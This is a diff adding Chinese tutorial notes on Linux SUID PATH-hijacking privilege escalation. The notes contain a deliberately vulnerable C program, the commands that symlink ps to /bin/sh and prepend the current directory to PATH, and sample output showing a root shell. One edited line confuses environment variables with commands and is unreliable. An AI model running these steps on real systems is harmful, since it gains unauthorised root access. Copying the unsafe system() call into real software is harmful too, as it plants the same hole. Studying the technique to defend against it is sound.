@@ -1,10 +1,61 @@
 原理详解
     命令查找顺序
-    当一个程序调用如 system()、execvp()、popen() 等不带绝对路径的命令名（例如只写 "ps"、"tar"），内核/库会依次在环境变量 PATH 中声明的各个目录里查找可执行文件，直到找到为止。
+    当一个程序调用如 system()、execvp()、popen() 等不带！！！‘绝对路径’！！！的命令名（例如只写 "ps"、"tar"），该命令名依赖path环境变量
 
     环境变量可控性
-    普通用户可以完全控制自己的 PATH，可以在最前面插入一个当前目录（.）或其他可写目录，从而让程序“误”先运行你放在该目录下的同名恶意程序。
+    普通用户可以完全控制自己的 PATH，就可以修改Path，使自己构造的相同名称的环境变量替代之前的环境变量，子的构造的环境变量指向/bin/sh,以root权限打开一个shell
 
     SUID 程序的不安全调用
     如果一个 SUID 程序内调用外部工具时没有使用绝对路径（如 /bin/ps），就会被上述查找顺序劫持——以高权限执行你伪造的版本。
+示例：
+假设有一个简单的 SUID 程序 vuln_call_ps，它只是调用 ps aux 并打印结果：
+1. 编写并安装带 SUID 的演示程序
+
+/* vuln_call_ps.c */
+#include <stdlib.h>
+int main() {
+    // 注意：这里故意不使用绝对路径，漏洞点在此
+    system("ps aux");
+    return 0;
+}
+
+编译为二进制文件，给予suid权限。
+
+此时，无论哪个普通用户执行 ./vuln_call_ps，都会以 root 权限运行 system("ps aux")。
+2. 构造劫持环境
+
+    在当前目录创建一个名为 ps 的软链接，指向交互式 shell：
+
+ln -s /bin/sh ps
+chmod +x ps
+
+ #命令解释：
+ln -s /bin/sh ps
+用于创建一个符号链接。ln 是用于创建链接的命令，-s 选项表明创建的是符号链接（软链接）。
+/bin/sh 是系统中 shell 解释器的路径，ps 则是要创建的链接名。这意味着创建了一个名为 ps 的符号链接，它指向 /bin/sh。
+简单来说，当执行 ps 这个命令时，实际上执行的是 /bin/sh。
+使用示例：在当前目录下运行该命令后，会生成一个名为 ps 的文件，通过 ls -l 命令查看，会看到类似如下的输出：
+
+lrwxrwxrwx 1 user user 7 May  8 15:30 ps -> /bin/sh
+
+其中 l 表示这是一个符号链接，ps 指向 /bin/sh。
+2. chmod +x ps
+命令功能：chmod 是用于修改文件权限的命令，+x 表示给文件添加可执行权限，ps 是要修改权限的文件名。所以该命令的作用是让 ps 这个符号链接具备可执行权限。
+
+将当前目录放到 PATH 最前面(让我们刚刚伪造的ps（实际上指向/bin/sh创建一个终端），从而替代掉之前的ps：
+
+export PATH=$PWD:$PATH
+
+执行 SUID 程序：
+
+$ ./vuln_call_ps
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+由于 system("ps aux") 会调用 execvp("ps", ...)，而你的 PATH 让它先找到当前目录下的 ps（其实是 /bin/sh），就直接以 root 权限给你打开了一个 shell。
+
+
+
+
+
 
